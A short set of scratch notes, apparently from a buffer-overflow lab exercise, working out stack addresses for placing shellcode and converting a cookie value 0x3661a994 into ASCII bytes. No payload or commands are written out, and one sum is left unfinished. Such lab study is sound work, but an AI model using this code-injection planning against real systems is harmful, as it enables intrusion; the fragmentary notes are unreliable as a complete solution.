
0x556400b0 + 0x28 =

lets place our shellscript on
0x55640088 + 0x81 = 0x55640109

            3661a994
cookie is 0x3661a994
so bytes are
33 36 36 31 61 39 39 34

this line is starts 0x81 from 0x55640088
